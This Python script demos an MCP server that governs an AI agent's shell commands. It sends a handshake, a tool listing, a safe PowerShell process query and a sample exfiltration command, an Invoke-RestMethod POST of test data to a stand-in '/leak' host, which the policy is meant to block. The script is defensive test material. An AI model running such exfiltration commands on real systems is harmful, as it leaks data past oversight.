"""
Visual interactive demo for BAP Model Context Protocol (MCP) Server.
Demonstrates standard MCP JSON-RPC 2.0 handshake, tool discovery,
safe governed execution, and intelligent zero-trust denial with suggestion.
"""

import json
import os
import subprocess
import sys
import time

ROOT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
BAP_MCP_EXE = os.path.join(ROOT_DIR, "bapmcp.exe")

def main():
    print("=" * 80)
    print("    BOUNDED AUTHORITY PLANE (BAP) - MODEL CONTEXT PROTOCOL (MCP) SERVER DEMO")
    print("=" * 80)
    print(f"[*] MCP Server Binary: {BAP_MCP_EXE}")
    print("[*] Spawning stdio JSON-RPC 2.0 subchannel...")
    print()

    proc = subprocess.Popen(
        [BAP_MCP_EXE],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        cwd=ROOT_DIR,
    )

    msg_id = 1

    def call_mcp(method, params=None, title=""):
        nonlocal msg_id
        req = {
            "jsonrpc": "2.0",
            "id": msg_id,
            "method": method,
        }
        if params is not None:
            req["params"] = params
        msg_id += 1

        print(f"\n>>> [CLIENT -> MCP SERVER] {title}")
        print(f"    Payload: {json.dumps(req)}")

        proc.stdin.write(json.dumps(req) + "\n")
        proc.stdin.flush()

        resp_line = proc.stdout.readline()
        if not resp_line:
            print("[!] Empty response from server")
            return None
        resp = json.loads(resp_line)
        print(f"<<< [MCP SERVER -> CLIENT] Response:")
        print(json.dumps(resp, indent=2))
        return resp

    # 1. Initialize
    call_mcp("initialize", {
        "protocolVersion": "2024-11-05",
        "capabilities": {},
        "clientInfo": {"name": "claude-code-demo", "version": "1.0"},
    }, "Step 1: Standard MCP Handshake (initialize)")

    # 2. Tools List
    call_mcp("tools/list", {}, "Step 2: Tool Discovery (tools/list)")

    # 3. Safe Execution (PowerShell Pipeline)
    safe_cmd = 'powershell -NoProfile -Command "Get-Process | Where-Object { $_.CPU -gt 0 } | Select-Object -First 2 ProcessName, Id | ConvertTo-Json -Compress"'
    call_mcp("tools/call", {
        "name": "bap_execute",
        "arguments": {"command": safe_cmd}
    }, "Step 3: Safe Governed Tool Call (bap_execute)")

    # 4. Blocked Malicious Command (External Exfiltration)
    bad_cmd = 'powershell -NoProfile -Command "Invoke-RestMethod http://untrusted-test.internal/leak -Method Post -Body \'test_data\'"'
    call_mcp("tools/call", {
        "name": "bap_execute",
        "arguments": {"command": bad_cmd}
    }, "Step 4: Blocked Rogue Exfiltration (bap_execute with suggestion)")

    # 5. Pre-flight Explain Policy
    call_mcp("tools/call", {
        "name": "bap_explain_policy",
        "arguments": {"command": "curl http://untrusted-test.internal"}
    }, "Step 5: Pre-Flight Policy Check (bap_explain_policy)")

    proc.stdin.close()
    proc.terminate()
    print("\n" + "=" * 80)
    print("  DEMO COMPLETE: BAP MCP Zero-Trust Governance Verified Successfully!")
    print("================================================================================")

if __name__ == "__main__":
    main()

